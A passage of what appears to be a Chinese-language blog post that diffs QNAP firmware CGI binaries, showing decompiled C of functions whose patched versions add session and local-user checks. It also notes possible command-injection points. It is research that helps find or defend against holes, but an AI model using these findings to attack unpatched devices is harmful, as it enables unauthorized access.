&#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    v8 = <span class="number">0</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                v8 = <span class="number">0</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v8 = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v6 = <span class="number">0LL</span>;</span><br><span class="line">            v8 = <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v6 = <span class="number">0LL</span>;</span><br><span class="line">          v8 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v1);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">      <span class="built_in">free</span>(v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0LL</span>;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = *(_QWORD *)(v6 + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v11 != <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = v11 - <span class="number">1</span>;</span><br><span class="line">      *(_QWORD *)(v6 + <span class="number">8</span>) = v12;</span><br><span class="line">      <span class="keyword">if</span> ( !v12 )</span><br><span class="line">        json_delete(v6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_412F10(<span class="string">&quot;linux_info&quot;</span>);</span><br><span class="line">  sub_412F50((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;linux_status&quot;</span>, <span class="number">1</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, v8, v13, v14, v16[<span class="number">0</span>]);</span><br><span class="line">  sub_412F30(<span class="string">&quot;linux_info&quot;</span>);</span><br><span class="line">  unlink(filename);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>sub_41BC0E代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_41BC0E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BOOL4 v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// r8d</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// r9d</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)Is_QPKG_Installed(<span class="string">&quot;container-station&quot;</span>) )</span><br><span class="line">    v0 = Is_QPKG_Installed(<span class="string">&quot;ubuntu-hd&quot;</span>) != <span class="number">0</span>;</span><br><span class="line">  sub_412F10(<span class="string">&quot;linux_info&quot;</span>);</span><br><span class="line">  sub_412F50((<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;linux_status&quot;</span>, <span class="number">1</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">&quot;%d&quot;</span>, v0, v1, v2);</span><br><span class="line">  sub_412F30(<span class="string">&quot;linux_info&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="change-password-cgi"><a href="#change-password-cgi" class="headerlink" title="change_password.cgi"></a>change_password.cgi</h4><p>只有一个函数发生变化，sub_4051d0和sub_405320增加了两段代码<br>第一段</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">v5 = CGI_Find_Parameter(a1, <span class="string">&quot;sid&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    CGI_Find_Parameter(a1, <span class="string">&quot;USER_NAME&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = *(_QWORD *)(v5 + <span class="number">8</span>);</span><br><span class="line">  v7 = CGI_Find_Parameter(a1, <span class="string">&quot;USER_NAME&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v7</span><br><span class="line">    || !v6</span><br><span class="line">    || (s2 = *(<span class="keyword">char</span> **)(v7 + <span class="number">8</span>)) == <span class="number">0LL</span></span><br><span class="line">    || (<span class="keyword">unsigned</span> <span class="keyword">int</span>)auth_get_session(v6, <span class="number">1LL</span>, &amp;unk_616B00)</span><br><span class="line">    || strcasecmp(::dest, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_11:</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1C8</span>uLL);</span><br><span class="line">    CGI_Get_Http_Info(s);</span><br><span class="line">    qnap_exec(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot;/sbin/ban_util&quot;</span>, <span class="string">&quot;add&quot;</span>, &amp;s[<span class="number">376</span>], <span class="string">&quot;5&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)Is_LDAP_Enable() )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_24;</span><br></pre></td></tr></table></figure>
+<p>第二段</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !strcasecmp(::dest, s2a) </span><br><span class="line">...</span><br><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1C8</span>uLL);</span><br><span class="line">CGI_Get_Http_Info(s);</span><br><span class="line">v12 = <span class="number">0LL</span>;</span><br><span class="line">qnap_exec(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot;/sbin/ban_util&quot;</span>, <span class="string">&quot;clear&quot;</span>, &amp;s[<span class="number">376</span>], <span class="string">&quot;5&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">v13 = v18;</span><br></pre></td></tr></table></figure>
+
+<h4 id="disk-manage"><a href="#disk-manage" class="headerlink" title="disk_manage"></a>disk_manage</h4><p>sub_435245和sub_464455存在较大区别<br>其中sub_464455中增加了许多显示信息用于显示磁盘相关信息等</p>
+<h4 id="privRequest"><a href="#privRequest" class="headerlink" title="privRequest"></a>privRequest</h4><p>sub_416B2B和sub_416B5B这里感觉可以尝试以下命令注入<br><img src="/images/2023-03-29164707.png" alt="avatar"></p>
+<h4 id="privWizard"><a href="#privWizard" class="headerlink" title="privWizard"></a>privWizard</h4><p>就只有一个函数有区别如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//49</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_41A480</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 Parameter; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v2; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  Parameter = CGI_Find_Parameter(a1, <span class="string">&quot;sid&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( Parameter )</span><br><span class="line">    v2 = *(<span class="keyword">const</span> <span class="keyword">char</span> **)(Parameter + <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v2 = <span class="number">0LL</span>;</span><br><span class="line">  mkdir(<span class="string">&quot;/home/httpd/cgi-bin/download&quot;</span>, <span class="number">0x2F3</span>u);</span><br><span class="line">  v3 = Export_MSDFS_Tree(<span class="string">&quot;/home/httpd/cgi-bin/download/ms-dfs-tree.bin&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;Location:/cgi-bin/download/ms-dfs-tree.bin?sid=%s\n&quot;</span></span><br><span class="line">      <span class="string">&quot;Content-Type:application/octet-stream\n&quot;</span></span><br><span class="line">      <span class="string">&quot;Content-Disposition:attachment;filename=ms-dfs-tree.bin\r\n&quot;</span></span><br><span class="line">      <span class="string">&quot;\r\n&quot;</span>,</span><br><span class="line">      v2);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//69</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_41A480</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 Parameter; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v2; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  Parameter = CGI_Find_Parameter(a1, <span class="string">&quot;sid&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( Parameter )</span><br><span class="line">    v2 = *(<span class="keyword">const</span> <span class="keyword">char</span> **)(Parameter + <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v2 = <span class="number">0LL</span>;</span><br><span class="line">  v3 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)auth_get_session(v2, <span class="number">1LL</span>, &amp;unk_639C40) )</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  mkdir(<span class="string">&quot;/home/httpd/cgi-bin/download&quot;</span>, <span class="number">0x2F3</span>u);</span><br><span class="line">  v3 = Export_MSDFS_Tree(<span class="string">&quot;/home/httpd/cgi-bin/download/ms-dfs-tree.bin&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Location:/cgi-bin/download/ms-dfs-tree.bin?sid=%s\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Content-Type:application/octet-stream\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Content-Disposition:attachment;filename=ms-dfs-tree.bin\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\r\n&quot;</span>,</span><br><span class="line">    v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>感觉不足以成为漏洞点</p>
+<h4 id="reset-password"><a href="#reset-password" class="headerlink" title="reset_password"></a>reset_password</h4><p>sub_406210和sub_406290，增加了个是否为本地用户的判断</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IsLocalUser(s)</span><br></pre></td></tr></table></figure>
+
+<h4 id="userConfig"><a href="#userConfig" class="headerlink" title="userConfig"></a>userConfig</h4><p>两个变化<br>sub_046815，变化如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//49</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_406815</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 Parameter; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v7; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v8; <span class="comment">// r12</span></span><br><span class="line">  _BOOL4 v9; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v12; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v13; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp-8h] [rbp-610h]</span></span><br><span class="line">  <span class="keyword">char</span> v17[<span class="number">272</span>]; <span class="comment">// [rsp+0h] [rbp-608h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">stat_buf</span>;</span> <span class="comment">// [rsp+110h] [rbp-4F8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> to[<span class="number">272</span>]; <span class="comment">// [rsp+1A0h] [rbp-468h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> filename[<span class="number">272</span>]; <span class="comment">// [rsp+2B0h] [rbp-358h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">272</span>]; <span class="comment">// [rsp+3C0h] [rbp-248h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">312</span>]; <span class="comment">// [rsp+4D0h] [rbp-138h] BYREF</span></span><br><span class="line"></span><br><span class="line">  Parameter = CGI_Find_Parameter(a1, <span class="string">&quot;showVersion&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( Parameter )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(<span class="keyword">const</span> <span class="keyword">char</span> **)(Parameter + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = strtol(v3, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">      Set_Profile_Integer(<span class="string">&quot;System&quot;</span>, <span class="string">&quot;showVersion&quot;</span>, v4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = CGI_Find_Parameter(a1, <span class="string">&quot;theme&quot;</span>);</span><br><span class="line">  v6 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *(<span class="keyword">const</span> <span class="keyword">char</span> **)(v5 + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)strtol(v7, <span class="number">0LL</span>, <span class="number">10</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(v8) = <span class="number">1</span>;</span><br><span class="line">        v9 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v8 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)strtol(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(v6 + <span class="number">8</span>), <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">snprintf</span>(s, <span class="number">0x100</span>uLL, <span class="string">&quot;%s/%s%d&quot;</span>, <span class="string">&quot;/home/httpd/cgi-bin/loginTheme&quot;</span>, <span class="string">&quot;theme&quot;</span>, v8);</span><br><span class="line">        v9 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !__xstat64(<span class="number">1</span>, s, &amp;stat_buf) )</span><br><span class="line">          v9 = (stat_buf.st_mode &amp; <span class="number">0xF000</span>) != <span class="number">0x4000</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v8) = <span class="number">1</span>;</span><br><span class="line">      v9 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v8) = <span class="number">1</span>;</span><br><span class="line">    v9 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = CGI_Find_Parameter(a1, <span class="string">&quot;bg&quot;</span>);</span><br><span class="line">  v11 = v10;</span><br><span class="line">  <span class="keyword">if</span> ( v10 &amp;&amp; (v12 = *(<span class="keyword">const</span> <span class="keyword">char</span> **)(v10 + <span class="number">8</span>)) != <span class="number">0LL</span> &amp;&amp; (<span class="keyword">int</span>)strtol(v12, <span class="number">0LL</span>, <span class="number">10</span>) &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)strtol(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(v11 + <span class="number">8</span>), <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">snprintf</span>(filename, <span class="number">0x100</span>uLL, <span class="string">&quot;%s/%s-%d.jpg&quot;</span>, <span class="string">&quot;/home/httpd/cgi-bin/images/desktop&quot;</span>, <span class="string">&quot;desktop&quot;</span>, v13);</span><br><span class="line">    v14 = v9 - ((__xstat64(<span class="number">1</span>, filename, &amp;stat_buf) == <span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = v9 + <span class="number">1</span>;</span><br><span class="line">    LODWORD(v13) = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v14 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_404AA4(<span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)v8 == <span class="number">10</span> )</span><br><span class="line">      <span class="built_in">snprintf</span>(v17, <span class="number">0x100</span>uLL, <span class="string">&quot;%s/%s&quot;</span>, <span class="string">&quot;/home/httpd/cgi-bin/loginTheme/html&quot;</span>, <span class="string">&quot;wall.html&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">snprintf</span>(v17, <span class="number">0x100</span>uLL, <span class="string">&quot;%s/%s&quot;</span>, <span class="string">&quot;/home/httpd/cgi-bin/loginTheme/html&quot;</span>, <span class="string">&quot;login.html&quot;</span>);</span><br><span class="line">    qnap_exec(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot;/bin/cp&quot;</span>, <span class="string">&quot;-rf&quot;</span>, v17, <span class="string">&quot;/home/httpd/cgi-bin/login.html&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">snprintf</span>(name, <span class="number">0x100</span>uLL, <span class="string">&quot;%s/%s&quot;</span>, <span class="string">&quot;/home/httpd/cgi-bin/loginTheme&quot;</span>, <span class="string">&quot;theme&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !unlink(name) )</span><br><span class="line">      qnap_exec(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot;/bin/rm&quot;</span>, <span class="string">&quot;-rf&quot;</span>, name, <span class="number">0LL</span>, v16);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">257</span>);</span><br><span class="line">    <span class="built_in">snprintf</span>(s, <span class="number">0x100</span>uLL, <span class="string">&quot;%s%d&quot;</span>, <span class="string">&quot;theme&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v8);</span><br><span class="line">    symlink(s, name);</span><br><span class="line">    <span class="built_in">snprintf</span>(to, <span class="number">0x100</span>uLL, <span class="string">&quot;%s/%s/%s.jpg&quot;</span>, <span class="string">&quot;/home/httpd/cgi-bin/loginTheme&quot;</span>, <span class="string">&quot;theme&quot;</span>, <span class="string">&quot;desktop&quot;</span>);</span><br><span class="line">    unlink(to);</span><br><span class="line">    symlink(filename, to);</span><br><span class="line">    Set_Profile_Integer(<span class="string">&quot;System&quot;</span>, <span class="string">&quot;LoginTheme410&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v8);</span><br><span class="line">    Set_Profile_Integer(<span class="string">&quot;System&quot;</span>, <span class="string">&quot;LoginBgNum&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v13);</span><br><span class="line">    sub_404AA4(<span class="number">1LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v14;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//98</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_406815</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 Parameter; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v6; <span class="comment">// rdi</span></span><br><span class="line">  _BOOL4 v7; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v10; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v11; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp-8h] [rbp-600h]</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">272</span>]; <span class="comment">// [rsp+0h] [rbp-5F8h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">stat_buf</span>;</span> <span class="comment">// [rsp+110h] [rbp-4E8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> to[<span class="number">272</span>]; <span class="comment">// [rsp+1A0h] [rbp-458h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> filename[<span class="number">272</span>]; <span class="comment">// [rsp+2B0h] [rbp-348h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">272</span>]; <span class="comment">// [rsp+3C0h] [rbp-238h] BYREF</span></span><br><span class="line">  <span 